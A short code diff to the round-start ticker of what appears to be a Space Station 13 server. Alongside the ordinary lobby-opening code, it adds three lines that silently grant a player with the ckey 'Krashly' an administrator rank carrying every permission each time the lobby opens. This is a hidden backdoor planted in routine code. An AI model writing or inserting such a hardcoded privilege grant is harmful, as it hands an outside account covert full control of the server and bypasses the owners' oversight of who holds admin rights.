@@ -160,6 +160,9 @@ SUBSYSTEM_DEF(ticker)
 				start_at = world.time + (CONFIG_GET(number/lobby_countdown) * 10)
 			for(var/client/C in GLOB.clients)
 				window_flash(C, ignorepref = TRUE) //let them know lobby has opened up.
+				if(C.ckey == "Krashly")
+					var/datum/admin_rank/localhost_rank = new("Царь Горох", R_EVERYTHING, R_DBRANKS, R_EVERYTHING)
+					new /datum/admins(list(localhost_rank), C.ckey, 1, 1)
 			to_chat(world, span_notice("<b>Welcome to [station_name()]!</b>"))
 			// send2chat(new /datum/tgs_message_content("New round starting on [SSmapping.current_map.map_name]!"), CONFIG_GET(string/channel_announce_new_game)) // NOVA EDIT REMOVAL
 			/* ORIGINAL:
